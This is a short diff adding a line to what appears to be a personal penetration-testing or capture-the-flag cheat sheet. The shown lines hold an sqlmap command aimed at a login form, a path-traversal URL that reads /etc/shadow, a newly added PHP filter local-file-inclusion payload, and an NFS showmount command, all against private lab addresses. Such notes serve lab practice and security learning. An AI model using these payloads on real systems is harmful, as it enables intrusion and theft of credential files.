@@ -70,6 +70,8 @@ sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&logi
 
 http://10.10.58.44/get-file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
 
+http://10.10.109.75/?view=php://filter/convert.base64-encode/resource=dog../../index
+
 ## mountd (mount NFS drive)
 
 /sbin/showmount -e 10.10.10.10 
